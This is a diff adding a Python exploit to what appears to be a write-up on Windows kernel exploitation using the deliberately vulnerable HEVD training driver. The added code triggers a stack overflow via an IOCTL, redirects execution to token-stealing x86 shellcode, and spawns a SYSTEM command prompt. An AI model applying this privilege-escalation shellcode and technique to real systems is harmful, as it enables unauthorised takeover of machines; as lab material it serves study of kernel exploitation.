@@ -140,6 +140,117 @@ token_stealing_shellcode = (
 ```
 Returning the id of our payload is required as a parameter for the `DeviceIoControl` function used above.
 
+```python
+import sys, os, subprocess, ctypes, struct
+from ctypes import *
+#from win32com.shell import shell
+
+def trigger_stack_overflow():
+
+    kernel32      	  = windll.kernel32
+
+    lpFileName            = "\\\\.\HackSysExtremeVulnerableDriver"
+    dwDesiredAccess       = 0xC0000000 # --> (Generic_Read (0x80000000) + Generic_Write (0x40000000))
+    dwShareMode           = 0
+    SecurityAttributes    = None
+    dwCreationDisposition = 0x3        # --> (Open_Existing)
+    dwFlagsAndAttributes  = 0
+    hTemplateFile         = None
+
+    device_handle = kernel32.CreateFileA( 
+    	lpFileName,
+	dwDesiredAccess,
+	dwShareMode,
+	SecurityAttributes,
+	dwCreationDisposition,
+	dwFlagsAndAttributes,
+	hTemplateFile
+    )
+
+    if not device_handle or device_handle == -1:
+        print("[!] Error creating Device handle: %s" %lpFileName)
+        sys.exit()
+    else:
+    	print("[+] Device handler setup successful")
+        print("[+] Device handle in use: %s" %lpFileName)
+
+    print("[+] Preparing the Ring0 Payload...")
+    # constructing the exploit payload
+
+    stack_overflow_exploit  = "\x41" * 2080
+    stack_overflow_exploit += struct.pack("<L",shellcode_payload())
+
+    id_payload = id(stack_overflow_exploit) + 20
+    bufSize = len(stack_overflow_exploit)
+    print("[+] Malicious payload size: %s" %bufSize)
+
+    hDevice			= device_handle	
+    dwIoControlCode		= 0x222003		# --> (HackSys_EVD_StackOverflow)
+    lpInBuffer			= id_payload
+    nInBufferSize		= bufSize
+    lpOutBuffer			= None
+    nOutBufferSize		= 0
+    lpBytesReturned		= byref(c_ulong())
+    pOverlapped			= None
+
+    kernel32.DeviceIoControl(
+    	hDevice,		# --> HANDLE
+    	dwIoControlCode,	# --> DWORD
+    	lpInBuffer,		# --> LPVOID
+    	nInBufferSize,		# --> DWORD
+    	lpOutBuffer,		# --> LPVOID
+    	nOutBufferSize,		# --> DWORD
+    	lpBytesReturned,	# --> LPDWORD
+    	pOverlapped		# --> LPOVERLAPPED
+    )
+
+    IOCTL_Name = "0x222003"
+    print("[+] IOCTL in use: %s" %IOCTL_Name)
+	
+    """
+    new_process = subprocess.Popen("start cmd", shell=True)
+    print("[+] Elevated CMD prompt PID: %s" %new_process.pid)
+    print("\n[+] Enjoy your NT Authority\System shell")
+    """
+    #-- Without using the win32com module you can still pop a shell, just comment out the admin check
+
+    if shell.IsUserAnAdmin():
+        new_process = subprocess.Popen("start cmd", shell=True)
+    	print("[+] Elevated CMD prompt PID: %s" %new_process.pid)
+    	print("\n[+] Enjoy your NT Authority\System shell")
+    else:
+        print("[!] Error running the exploit")
+
+def shellcode_payload():
+    token_stealing_shellcode = (
+        "\x60"                            # pushad
+        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
+        "\x8b\x40\x50"                    # mov eax,[eax+0x50]
+        "\x89\xc1"                        # mov ecx,eax
+        "\xba\x04\x00\x00\x00"            # mov edx,0x4
+        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
+        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
+        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
+        "\x75\xed"                        # jnz 0x1a
+        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
+        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
+        "\x61"                            # popad
+        "\x31\xC0"                        # NTSTATUS -> STATUS_SUCCESS
+        "\x5D"                            # pop ebp
+        "\xC2\x08\x00"                    # ret 8
+    )
+
+    shellcode_address = id(token_stealing_shellcode) + 20
+    print("[+] Shellcode payloads address: %s" %shellcode_address)
+    print("[+] Stealing NT Authority\System token...")
+    return shellcode_address
+
+if __name__ == '__main__':
+    print("\n[+] HEVD stack-based overflow exploit\n")
+    print("[+] Starting exploit...")
+    trigger_stack_overflow()
+```
+
 **Getting NT Authority \ SYSTEM**
 
 ![cmd shell as system](https://raw.githubusercontent.com/x00pwn/Windows-Kernel-Exploitation-HEVD/master/images/HEVD_stack-overflow.png)
